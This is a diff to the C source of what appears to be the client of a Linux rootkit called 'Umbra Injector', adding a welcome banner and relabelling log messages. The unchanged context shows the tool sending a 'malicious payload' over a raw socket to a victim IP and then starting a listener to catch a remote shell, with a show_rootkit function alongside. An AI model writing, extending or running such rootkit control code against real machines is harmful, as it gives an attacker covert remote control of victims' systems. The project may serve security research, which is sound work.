@@ -17,6 +17,14 @@
 #define KRED  "\x1B[31m" 
 #define RESET "\x1B[0m"
 
+void print_welcome_message(){
+    printf("*******************************************************\n");
+    printf("************* Umbra  Injector *************************\n");
+    printf("*******************************************************\n");
+    printf("************ https://github.com/h3xduck/Umbra *********\n");
+    printf("*******************************************************\n");
+}
+
 void print_help_dialog(const char* arg){
     printf("Usage: %s [OPTION] [victim_IP]\n\n", arg);
     printf("Program OPTIONs\n");
@@ -42,13 +50,13 @@ char* getLocalIpAddress(){
   
     hostname = gethostname(hostbuffer, sizeof(hostbuffer));
     if(hostname==-1){
-        perror("["KRED"INFO"RESET"]""Error getting local IP: gethostname");
+        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
         exit(1);
     }
   
     host_entry = gethostbyname(hostbuffer);
     if(host_entry == NULL){
-        perror("["KRED"INFO"RESET"]""Error getting local IP: gethostbyname");
+        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
         exit(1);
     }
   
@@ -70,15 +78,15 @@ void get_shell(char* argv){
     pid_t pid;
     pid = fork();
     if(pid < 0){
-        perror("["KRED"INFO"RESET"]""Could not create another process");
+        perror("["KRED"ERROR"RESET"]""Could not create another process");
 	    return;
 	}else if(pid==0){
         sleep(1);
         //Sending the malicious payload
         if(rawsocket_send(packet)<0){
-            printf("["KRED"INFO"RESET"]""An error occured. Is the machine up?\n");
+            printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
         }else{
-            printf("["KGRN"INFO"RESET"]""Payload successfully sent!\n");
+            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
         }
         
     }else {
@@ -92,10 +100,10 @@ void get_shell(char* argv){
 
         printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
         if(execvp(cmd, argv)<0){
-            perror("["KRED"INFO"RESET"]""Error executing background listener");
+            perror("["KRED"ERROR"RESET"]""Error executing background listener");
             return;
         }
-        printf("["KGRN"INFO"RESET"]""Got a shell\n");
+        printf("["KGRN"OK"RESET"]""Got a shell\n");
     }
     
     free(local_ip);
@@ -108,10 +116,12 @@ void show_rootkit(char* argv){
 
 void main(int argc, char* argv[]){
     if(argc<2){
-        printf("["KRED"INFO"RESET"]""Invalid number of arguments\n");
+        printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
         print_help_dialog(argv[0]);
         return;
     }
+    print_welcome_message();
+    sleep(1);
     
     
     int opt;
@@ -143,10 +153,10 @@ void main(int argc, char* argv[]){
             exit(0);
             break;
         case '?':
-            printf("["KRED"INFO"RESET"]""Unknown option: %c\n", optopt);
+            printf("["KRED"ERROR"RESET"]""Unknown option: %c\n", optopt);
             break;
         case ':':
-            printf("["KRED"INFO"RESET"]""Missing arguments for %c\n", optopt);
+            printf("["KRED"ERROR"RESET"]""Missing arguments for %c\n", optopt);
             exit(EXIT_FAILURE);
             break;
         
